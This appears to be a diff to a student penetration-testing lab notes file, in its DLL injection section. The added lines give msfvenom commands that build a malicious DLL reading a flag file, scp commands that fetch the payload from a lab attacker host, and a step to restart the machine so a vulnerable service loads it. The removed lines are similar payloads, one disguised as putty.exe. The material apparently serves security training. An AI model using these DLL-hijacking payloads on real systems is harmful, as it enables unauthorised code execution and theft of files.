@@ -610,8 +610,11 @@ procmon
     	Result contains NAME NOT FOUND or (NAME_NOT_FOUND)
      
 ## Dll injection
-
- 	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
-	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > putty.exe
-	scp 10.50.22.235:/home/student/putty.exe . 
+Find vulnerable service and the dll thats runwith it. After scp the payload over, restart the box to get the requested output. 
+ 
+	msfvenom -p windows/exec CMD='cmd.exe /C "dir C:\Users\Admin\Desktop" > C:\MemoryStatus\dir.txt' -f dll > hijackmeplz.dll
+ 		scp student@10.50.22.235:/home/student/hijackmeplz.dll . (Run on the target Machine)
+  
+	msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\MemoryStatus\flag.txt' -f dll > hijackmeplz.dll
+		scp student@10.50.22.235:/home/student/hijackmeplz.dll . (Run on the target Machine)
   
